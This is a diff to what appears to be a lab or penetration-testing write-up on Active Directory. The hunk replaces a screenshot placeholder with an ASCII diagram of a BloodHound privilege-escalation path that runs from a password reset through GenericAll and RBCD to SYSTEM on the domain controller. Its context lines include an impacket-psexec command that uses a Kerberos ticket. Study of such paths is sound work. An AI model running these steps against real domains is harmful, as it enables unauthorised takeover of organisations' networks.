@@ -139,11 +139,18 @@ export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass TARGET.corp.local
 ```
 
-<div class="img-placeholder">
-  <span class="ph-icon">🖼️</span>
-  <span class="ph-label">SCREENSHOT PLACEHOLDER</span>
-  <span class="ph-desc">BloodHound edge: m.rossi --GenericAll--> Helpdesk Admins --GenericAll--> DC01</span>
-</div>
+BloodHound outbound-control path (what the graph reveals):
+
+```terminal
+ (owned)                     ForceChangePassword
+ [ m.rossi ] --------------------------------------> [ svc_helpdesk ]
+                                                            |  MemberOf
+                                                            v
+                                                    ( Helpdesk Admins )
+                                                            |  GenericAll
+                                                            v
+                                                      [[ DC01 ]]  => RBCD => SYSTEM on the DC
+```
 
 ## Complete Attack Chain
 
